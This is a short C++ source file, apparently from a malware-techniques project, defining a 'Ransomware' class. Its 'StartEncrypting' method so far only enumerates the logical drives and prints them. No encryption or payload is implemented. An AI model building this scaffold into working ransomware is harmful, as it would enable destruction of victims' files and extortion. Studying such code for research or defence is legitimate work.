#include "ransomware.h"
#include "../MalwareTechniques/ntdll.h"
#include "../Logger/logger.h"

#include <iostream>

#include <Windows.h>

namespace maltech {

    namespace ransom {

        Ransomware::Ransomware(ntdll::NtDll& ntdll)
            : ntdll_(ntdll)
        {
        }

        void Ransomware::StartEncrypting() {
            DWORD drivers = GetLogicalDrives();
            std::cout << "Found drivers: " << drivers << std::endl;
        }

    }

}